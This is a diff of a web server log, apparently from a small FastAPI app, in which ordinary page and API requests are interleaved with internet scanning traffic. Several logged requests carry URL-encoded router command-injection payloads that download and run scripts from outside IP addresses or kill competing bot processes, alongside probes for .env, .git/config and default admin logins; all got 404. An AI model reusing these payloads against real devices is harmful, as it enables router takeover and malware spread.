@@ -2,49 +2,263 @@ INFO:numexpr.utils:NumExpr defaulting to 2 threads.
 INFO:datasets:PyTorch version 2.3.1 available.
 INFO:sentence_transformers.SentenceTransformer:Load pretrained SentenceTransformer: /root/huggingface_cache/bce-embedding-base_v1
 INFO:chromadb.telemetry.product.posthog:Anonymized telemetry enabled. See                     https://docs.trychroma.com/telemetry for more information.
-INFO:     Started server process [11554]
+INFO:     Started server process [3118]
 INFO:     Waiting for application startup.
 INFO:     Application startup complete.
 INFO:     Uvicorn running on http://0.0.0.0:8886 (Press CTRL+C to quit)
-INFO:     127.0.0.1:51926 - "GET /index/ HTTP/1.1" 200 OK
-INFO:     127.0.0.1:51940 - "GET /js/index.8d171158.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42746 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50106 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59670 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47998 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48012 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33396 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43958 - "GET /portal/redlion HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37560 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54964 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48094 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48104 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48112 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48128 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48134 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48142 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48146 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48160 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37942 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46376 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48736 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48750 - "POST / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52240 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44656 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56912 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60840 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52110 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42098 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57810 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52792 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39208 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47490 - "GET /js/index.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:32988 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44888 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44896 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59038 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54746 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53464 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60746 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34252 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34260 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52136 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36702 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58948 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40158 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38300 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41068 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49178 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47760 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39764 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44126 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47724 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:32938 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53164 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47700 - "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57898 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60834 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47976 - "GET /owncloud/status.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47988 - "GET /status.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33798 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37636 - "GET /index HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:37644 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37646 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37658 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37674 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37682 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45692 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45696 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45710 - "GET /favicon.webp HTTP/1.1" 404 Not Found
 127.0.0.1
-INFO:     127.0.0.1:55834 - "POST /api HTTP/1.1" 200 OK
-INFO:     127.0.0.1:40260 - "GET / HTTP/1.1" 404 Not Found
-INFO:     127.0.0.1:41448 - "GET / HTTP/1.1" 404 Not Found
-INFO:     127.0.0.1:41454 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-INFO:     127.0.0.1:35118 - "GET /index HTTP/1.1" 307 Temporary Redirect
-INFO:     127.0.0.1:35122 - "GET /index/ HTTP/1.1" 200 OK
-INFO:     127.0.0.1:35132 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
-INFO:     127.0.0.1:35146 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
-INFO:     127.0.0.1:35148 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
-INFO:     127.0.0.1:35158 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
-INFO:     127.0.0.1:53444 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
-INFO:     127.0.0.1:53454 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
-INFO:     127.0.0.1:53456 - "GET /favicon.webp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45726 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41938 - "GET /index/ HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:41944 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:41956 - "GET /css/index.e9a2e66b.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:41968 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:41974 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41976 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41982 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41988 - "GET /favicon.webp HTTP/1.1" 404 Not Found
 127.0.0.1
-INFO:     127.0.0.1:53466 - "POST /api HTTP/1.1" 200 OK
-INFO:     127.0.0.1:56308 - "GET /js/index.8d171158.js HTTP/1.1" 304 Not Modified
-INFO:     127.0.0.1:40212 - "GET /favicon.webp HTTP/1.1" 404 Not Found
-INFO:     127.0.0.1:51220 - "GET /index/ HTTP/1.1" 200 OK
-INFO:     127.0.0.1:51234 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
-INFO:     127.0.0.1:51248 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
-INFO:     127.0.0.1:51252 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
-INFO:     127.0.0.1:51268 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
-INFO:     127.0.0.1:44860 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
-INFO:     127.0.0.1:44868 - "GET /js/chunk-vendors.4ca63510.js.map HTTP/1.1" 200 OK
-INFO:     127.0.0.1:44884 - "GET /js/index.8d171158.js.map HTTP/1.1" 200 OK
-INFO:     127.0.0.1:44894 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
-INFO:     127.0.0.1:44898 - "GET /js/webfontloader.9f1d327d.js.map HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58088 - "POST /api HTTP/1.1" 200 OK
 127.0.0.1
-INFO:     127.0.0.1:44258 - "POST /api HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45394 - "GET /favicon.webp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53214 - "POST /api HTTP/1.1" 200 OK
 127.0.0.1
-INFO:     127.0.0.1:50350 - "POST /api HTTP/1.1" 200 OK
-INFO:     127.0.0.1:33446 - "GET /js/chunk-vendors.4ca63510.js.map HTTP/1.1" 200 OK
-INFO:     127.0.0.1:33456 - "GET /js/index.8d171158.js.map HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58852 - "POST /api HTTP/1.1" 200 OK
 127.0.0.1
-INFO:     127.0.0.1:60356 - "POST /api HTTP/1.1" 200 OK
-INFO:     127.0.0.1:59782 - "GET /index HTTP/1.1" 307 Temporary Redirect
-INFO:     127.0.0.1:59788 - "GET /js/index.8d171158.js HTTP/1.1" 304 Not Modified
-INFO:     127.0.0.1:60744 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34022 - "POST /api HTTP/1.1" 200 OK
+127.0.0.1
+INFO:     127.0.0.1:45716 - "POST /api HTTP/1.1" 200 OK
+127.0.0.1
+INFO:     127.0.0.1:38778 - "POST /api HTTP/1.1" 200 OK
+127.0.0.1
+INFO:     127.0.0.1:50348 - "POST /api HTTP/1.1" 200 OK
+127.0.0.1
+INFO:     127.0.0.1:54322 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41332 - "GET / HTTP/1.1" 404 Not Found
+127.0.0.1
+INFO:     127.0.0.1:35154 - "POST /api HTTP/1.1" 200 OK
+127.0.0.1
+INFO:     127.0.0.1:59844 - "POST /api HTTP/1.1" 200 OK
+127.0.0.1
+INFO:     127.0.0.1:43084 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60748 - "GET /index/ HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:50300 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39278 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40334 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46714 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53738 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34464 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33636 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50100 - "GET /cgi-bin/luci/ HTTP/1.1" 404 Not Found
+127.0.0.1
+INFO:     127.0.0.1:58302 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50670 - "GET / HTTP/1.1" 404 Not Found
+127.0.0.1
+INFO:     127.0.0.1:42378 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59146 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35392 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35396 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46594 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60806 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57874 - "GET /.git/config HTTP/1.1" 404 Not Found
+127.0.0.1
+INFO:     127.0.0.1:51772 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36592 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45150 - "GET /index/ HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:45154 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:45166 - "GET /css/index.e9a2e66b.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:45172 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:45184 - "GET /js/index.8d171158.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:45194 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:45210 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:54560 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54576 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54590 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54594 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54602 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54604 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54606 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54610 - "GET /favicon.webp HTTP/1.1" 404 Not Found
+127.0.0.1
+INFO:     127.0.0.1:33988 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35240 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59990 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57930 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36264 - "GET / HTTP/1.1" 404 Not Found
+127.0.0.1
+INFO:     127.0.0.1:48098 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38124 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41048 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48148 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50814 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50824 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50826 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50836 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50844 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42234 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42242 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42258 - "GET /favicon.webp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41160 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58194 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43006 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47894 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38458 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42620 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41162 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41432 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41440 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42270 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60468 - "GET /src/views/user/login.html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45970 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35798 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58884 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37878 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60356 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33748 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54120 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51430 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50208 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36122 - "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52940 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48230 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36040 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57710 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45332 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45346 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44960 - "GET /druid/index.html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35850 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51024 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54146 - "GET /hudson HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47092 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48214 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53516 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42578 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:32890 - "GET /ReportServer HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52808 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43662 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38366 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51504 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49918 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57532 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59290 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40926 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:32940 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54466 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48848 - "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33526 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58410 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50422 - "GET /ReportServer HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59364 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59378 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59380 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59392 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51172 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51186 - "POST / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47942 - "GET /index/ HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47950 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47962 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47972 - "GET /js/index.8d171158.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47976 - "GET /css/index.e9a2e66b.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47980 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47992 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 304 Not Modified
+127.0.0.1
+INFO:     127.0.0.1:59680 - "POST /api HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44712 - "GET /index HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:44726 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44728 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44734 - "GET /index HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:44740 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44754 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44760 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44764 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44774 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33802 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33806 - "GET /index HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:33822 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33834 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33838 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33842 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33852 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33856 - "GET /index HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:33864 - "GET /index/ HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33876 - "GET /js/chunk-vendors.4ca63510.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33880 - "GET /js/index.8d171158.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33892 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33896 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33912 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33920 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56454 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56468 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56470 - "GET /js/webfontloader.9f1d327d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56486 - "GET /fonts/materialdesignicons-webfont.54b0f60d.woff2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45864 - "GET /css/chunk-vendors.1441fc24.css HTTP/1.1" 200 OK
